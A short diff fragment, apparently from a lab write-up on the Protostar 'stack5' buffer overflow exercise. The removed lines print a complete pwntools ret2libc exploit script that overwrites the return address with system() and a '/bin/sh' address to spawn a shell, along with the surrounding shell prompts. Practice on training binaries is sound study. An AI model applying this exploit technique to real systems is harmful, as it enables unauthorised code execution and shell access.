@@ -119,25 +119,6 @@ p = process(['./stack5'])
 p.sendline(payload)
 
 p.interactive()
-root@kali:~/Desktop/bin# vi stack5_ex2.py 
-root@kali:~/Desktop/bin# cat stack5_ex2.py 
-from pwn import *
-
-system     = p32(0xf7e0f7e0)
-
-dummy      = p32(0xffffffff)
-
-binsh_addr = p32(0xf7f4e968)
-
-offset     = 76
-
-payload = "A"*offset + system + dummy + binsh_addr
-
-p = process(['./stack5'])
-
-p.sendline(payload)
-
-p.interactive()
 
 root@kali:~/Desktop/bin# python stack5_ex2.py 
 [+] Starting local process './stack5': pid 3631
